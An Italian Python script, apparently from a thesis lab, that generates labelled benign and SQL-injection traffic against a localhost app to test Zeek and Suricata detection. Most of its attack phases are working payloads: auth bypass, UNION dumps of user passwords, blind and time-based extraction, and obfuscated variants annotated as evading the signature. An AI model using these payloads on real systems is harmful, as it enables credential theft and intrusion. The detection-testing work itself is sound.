#!/usr/bin/env python3
"""
generate_traffic.py - genera traffico verso l'app e produce la ground-truth.
Riproduce un comportamento intrusivo: l'attaccante prima naviga il
sito come un utente normale, poi sonda la presenza di una SQL injection,
infine invia richieste contenenti i payload funzionanti, comprese alcune
varianti offuscate.

A ogni richiesta viene assegnato un identificativo univoco (parametro "tid" nell'URI),
che compare nei log di Zeek e Suricata e permette di associare ogni allarme alla richiesta e alla sua classe.

Alcune richieste sono accumunate dallo stesso payload inviato con richieste GET e POST, così da
mettere in evidenza i punti ciechi delle configurazioni analizzate.

Lo script deve essere eseguito mentre la cattura del traffico e' attiva con:
    python3 generate_traffic.py mixed

Classi delle richieste:
    benigne         traffico normale
    sospette        legittimo ma insolito (apostrofi, accenti, stringhe lunghe)
    sqli_probe      input per il sondaggio delle vulnerabilità
    sqli_logic / sqli_union / sqli_blind / sqli_time   payload noti funzionanti
    sqli_obfuscated varianti offuscate dei payload
"""
import argparse
import csv
import time
import requests

BASE = "http://localhost:8080"
PAUSE = 0.3
TIMEOUT = 20.0
SESSION = None
WRITER = None
TID = 0

def send(method, path, label, params=None, json_body=None):
    """Invia una richiesta con il parametro tid e ne registra l'esito."""
    global TID
    TID += 1
    params = dict(params or {})
    params["tid"] = TID
    start = time.perf_counter()
    resp = None
    try:
        resp = SESSION.request(method, BASE + path, params=params,
                               json=json_body, timeout=TIMEOUT)
    except requests.RequestException as exc:
        print(f"  [!] {method} {path} tid={TID} -> {exc}")
    code = resp.status_code if resp is not None else 0
    WRITER.writerow([TID, int(time.time()), method, path, label, code,
                     f"{time.perf_counter() - start:.3f}"])
    time.sleep(PAUSE)

def search(name, label):
    send("GET", "/api/v1/search", label, params={"name": name})

def login(username, password, label):
    send("POST", "/api/v1/session", label,
         json_body={"username": username, "password": password})

def browse(path, label):
    send("GET", path, label)

def main():
    global BASE, PAUSE, TIMEOUT, SESSION, WRITER

    ap = argparse.ArgumentParser(
        description="Generatore di traffico per il Laboratorio Tesi.")
    ap.add_argument("mode", nargs="?", choices=["benign", "mixed"],
                    default="mixed", help="tipo di traffico da generare")
    ap.add_argument("--base", default="http://localhost:8080",
                    help="URL di base del servizio")
    ap.add_argument("--out", default="ground_truth.csv",
                    help="file CSV di ground-truth")
    ap.add_argument("--pause", type=float, default=0.3,
                    help="pausa tra le richieste, in secondi")
    ap.add_argument("--timeout", type=float, default=20.0,
                    help="timeout per richiesta (deve superare gli SLEEP)")
    args = ap.parse_args()

    BASE = args.base.rstrip("/")
    PAUSE = args.pause
    TIMEOUT = args.timeout
    SESSION = requests.Session()
    SESSION.headers.update({"Connection": "close"})

    out = open(args.out, "w", newline="")
    WRITER = csv.writer(out)
    WRITER.writerow(["tid", "epoch", "method", "path",
                     "class", "http_code", "time_total"])

    print(f"[*] MODE={args.mode}  BASE={BASE}")

    # --------------------------------------------------------------------------------------------
    # Fase 1: navigazione legittima. All'inizio l'attaccante si comporta come un utente qualsiasi.
    # --------------------------------------------------------------------------------------------
    print("[*] Fase 1: navigazione legittima")
    for path in ["/", "/assets/main.css", "/assets/app.js", "/favicon.ico"]:
        browse(path, "benigne")

    benign_terms = [
        "tastiera", "mouse", "monitor", "sedia", "cuffie", "auricolari",
        "portatile", "hub", "webcam", "ufficio", "meccanica", "senza fili",
        "ssd", "lampada", "supporto", "usb", "bluetooth", "ergonomica",
        "caffè", "monitor economico", "migliore tastiera", "mouse da gioco",
        "cuffie con microfono", "scrivania", "cavo", "adattatore", "dock",
        "27 pollici", "ssd esterno", "supporto per portatile",
        "tastiera meccanica", "mouse ottico", "usb-c", "macchina per il caffè",
        "webcam full hd", "hub usb-c", "lampada da scrivania",
        "tastiera senza fili", "rgb",
    ]
    for term in benign_terms:
        search(term, "benigne")

    benign_logins = [
        ("giulia", "password123"), ("marco", "hunter2"),
        ("chiara", "qwerty2020"), ("luca", "lasciamientrare"),
        ("sara", "primavera2026"), ("andrea", "cavallocorretto"),
        ("elena", "soleluna"), ("paolo", "p@ssw0rd"),
        ("davide", "monitor99"), ("francesca", "benvenuto1")]
    
    for user, pw in benign_logins:
        login(user, pw, "benigne")
    login("giulia", "passwordsbagliata", "benigne")   # errore di accesso legittimo
    login("marco", "no", "benigne")

    # ---------------------------------------------------------------------------------------------------------------------
    # Fase 2: traffico legittimo ma insolito, con caratteristiche superficialmente sospette: comprende apostrofi e accenti,
    # stringhe lunghe, e parole che sono anche keyword SQL che compaiono in un contesto di ricerca ammissibile.
    # ---------------------------------------------------------------------------------------------------------------------
    print("[*] Fase 2: traffico legittimo insolito")
    weird_names = [
        # apostrofi:
        "D'Amico", "Sant'Elia", "dell'Orto", "L'Aquila", "d'Annunzio",
        # accenti:
        "caffè", "tè", "perché", "città", "Peppè",
        # termini che contengono parole chiave SQL ma sono ricerche legittime
        "porta AND", "porta OR", "cavo null modem", "Union Jack",
        "escape room", "tasto CANC", "select comfort", "drop test",
        # caratteri speciali in contesto lecito:
        "libro C++", "adattatore AT&T", "sconto 50%", "n.1 in vendita",
        "offerta 1+1"]

    for name in weird_names:
        search(name, "sospette")
    search("a" * 200, "sospette")               # stringa molto lunga
    search("tastiera " * 30, "sospette")
    for i in (1, 2, 3):
        login("chiara", f"sbagliata{i}", "sospette")  # errori ripetuti
    login("d'amico", "qualcosa", "sospette")     # apostrofo in un nome vero

    if args.mode != "mixed":
        out.close()
        print(f"[*] fatto (solo traffico legittimo). {args.out}")
        return
    # -------------------------------------------------------------------------------------------------------------------
    # Fase 3: sondaggio delle vulnerabilità. L'attaccante prova a capire se il servizio è vulnerabile all'attacco, 
    # con input minimi che non estraggono ancora nulla: un apostrofo per provocare un errore, test booleani, 
    # un tentativo di commento. Sono richieste che assomigliano al traffico insolito della fase precedente.
    # -------------------------------------------------------------------------------------------------------------------
    print("[*] Fase 3: sondaggio della vulnerabilità")
    search("keyboard'", "sqli_probe")                # singolo apice
    search('keyboard"', "sqli_probe")                # doppio apice
    search("keyboard' AND '1'='1", "sqli_probe")     # test booleano (vero)
    search("keyboard' AND '1'='2", "sqli_probe")     # test booleano (falso)
    search("keyboard'-- ", "sqli_probe")             # tentativo di commento
    search("keyboard'#", "sqli_probe")               # commento stile MySQL
    login("admin'", "x", "sqli_probe")               # test sul login
    login("admin' AND '1'='1", "x", "sqli_probe")    # test booleano sul login
    # ------------------------------------------------------------------------------------------------------------
    # Fase 4: attacco. Individuata la vulnerabilità, l'attaccante invia le richieste con payload funzionanti. 
    # Uno stesso payload può comparire in modo identico in coppie di richieste GET/POST.
    # ------------------------------------------------------------------------------------------------------------
    print("[*] Fase 4: attacco")
    # --- auth bypass (logica) --------------------------------------------
    login("admin' -- ", "x", "sqli_logic")
    login("admin' OR '1'='1", "x", "sqli_logic")
    login("' OR '1'='1' -- ", "x", "sqli_logic")
    login("' OR 1=1 -- ", "x", "sqli_logic")
    login("x", "' OR '1'='1' -- ", "sqli_logic")
    # --- union (esfiltrazione informazioni) ------------------------------
    # Coppia #1: lo STESSO payload union a 6 colonne inviato sulla
    # ricerca (URI, GET) e sul login (corpo JSON, POST).
    pair1 = ("zzz%' UNION SELECT id, 0, username, password, '', '' FROM users -- ")
    search(pair1, "sqli_union")                        # union su GET (URI)
    login(pair1, "x", "sqli_union")                    # union su POST (corpo)
    # Coppia controllata #2: union basata su NULL, altra disposizione di colonne.
    pair2 = ("zzz%' UNION SELECT NULL, username, NULL, password, NULL, NULL FROM users -- ")
    search(pair2, "sqli_union")                        # GET
    login(pair2, "x", "sqli_union")                    # POST
    # Varianti aggiuntive solo su GET:
    search("zzz%' UNION SELECT 1,2,3,4,5,6 -- ", "sqli_union")   # sonda n. colonne
    search("zzz%' UNION SELECT id,name,price,'','','' FROM products -- ", "sqli_union") # union sulla stessa tabella
    # --- boolean-blind --------------------------
    blind = ("keyboard%' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),{pos},1)='{ch}' -- ")
    search(blind.format(pos=1, ch="S"), "sqli_blind")  # 1a lettera = 'S' (vero)
    search(blind.format(pos=1, ch="a"), "sqli_blind")  # 1a lettera = 'a' (falso)
    search(blind.format(pos=2, ch="3"), "sqli_blind")  # 2a lettera = '3' (vero)
    search(blind.format(pos=2, ch="z"), "sqli_blind")  # 2a lettera = 'z' (falso)
    search(blind.format(pos=3, ch="c"), "sqli_blind")  # 3a lettera = 'c' (vero)
    # blind anche sul login (POST):
    login("x' OR SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='S' -- ", "x", "sqli_blind")
    # --- time-based ---------------------
    search("nomatch%' UNION SELECT SLEEP(2),2,3,4,5,6 -- ", "sqli_time") # GET
    # Forma condizionale con CASE:
    search("nomatch%' UNION SELECT (SELECT CASE WHEN (1=1) THEN SLEEP(2) ELSE 0 END),2,3,4,5,6 -- ", "sqli_time") # GET
    # Time-based sul login (POST):
    login("admin' AND SLEEP(2) -- ", "x", "sqli_time") # POST
    # Seconda time-based su GET con durata diversa.
    search("nomatch%' UNION SELECT SLEEP(3),2,3,4,5,6 -- ", "sqli_time")  # GET
    # ----------------------------------------------------------------------------------
    # Fase 5: attacchi offuscati. Stessi attacchi ma mascherati per eludere i rilevatori
    # ----------------------------------------------------------------------------------
    print("[*] Fase 5: varianti offuscate")
    # commento inline al posto degli spazi
    search("zzz%' UNION/**/SELECT/**/id,0,username,password,'','' FROM/**/users -- ", "sqli_obfuscated")
    # maiuscole/minuscole alternate
    search("zzz%' uNiOn sElEcT id,0,username,password,'','' FrOm users -- ", "sqli_obfuscated")
    # case alternato + commenti al posto degli spazi
    search("zzz%' uNiOn/**/sElEcT id,0,username,password,'','' fRoM/**/users-- ", "sqli_obfuscated")
    # whitespace non convenzionale: tab e newline
    search("zzz%'\tUNION\nSELECT\tid,0,username,password,'','' FROM\tusers -- ", "sqli_obfuscated")
    # commento versionato in stile MySQL (/*! ... */)
    search("zzz%' /*!UNION*/ /*!SELECT*/ id,0,username,password,'','' FROM users -- ", "sqli_obfuscated")
    # doppia codifica URL: %27 e' gia' un apostrofo codificato; requests
    # codifica il '%', quindi sul filo viaggia %2527 (apostrofo codificato due
    # volte). Dopo l'unica decodifica di Zeek resta %27, non un apostrofo: il
    # payload e' booleano (OR) e non espone parole chiave, quindi NESSUNA delle
    # sei alternative della firma lo intercetta.
    search("keyboard%27 OR %271%27=%271 -- ", "sqli_obfuscated")
    # stessa doppia codifica dell'apostrofo, ma con UNION SELECT in chiaro:
    # la firma la cattura tramite l'alternativa sulle parole chiave.
    # Qui non e' la doppia codifica a eludere, ma l'assenza di pattern
    # diversi dall'apostrofo.
    search("zzz%27 UNION SELECT 1,2,3,4,5,6 -- ", "sqli_obfuscated")
    # doppia codifica, ma con una funzione SQL in chiaro
    # (ascii/substring): catturata dall'alternativa sulle funzioni. Mostra che
    # un secondo ramo della regex sopravvive alla doppia codifica.
    search("zzz%27 AND ascii(substring(version(),1,1))>52 -- ", "sqli_obfuscated")
    # auth-bypass offuscato (commento inline al posto dello spazio) sul login
    login("admin'/**/-- ", "x", "sqli_obfuscated")
    # union offuscata anche su POST (coppia con la prima richiesta offuscata GET)
    login("zzz%' UNION/**/SELECT/**/id,0,username,password,'','' "
          "FROM/**/users -- ", "x", "sqli_obfuscated")
    # time-based offuscata (case alternato)
    search("nomatch%' uNiOn/**/sElEcT SLEEP(2),2,3,4,5,6-- ", "sqli_obfuscated")
    # blind offuscata (case alternato)
    search("keyboard%' AnD sUbStRiNg((SELECT password FROM users "
           "WHERE username='admin'),1,1)='S'-- ", "sqli_obfuscated")
    out.close()
    print(f"[*] fatto (misto). {args.out}")

if __name__ == "__main__":
    main()
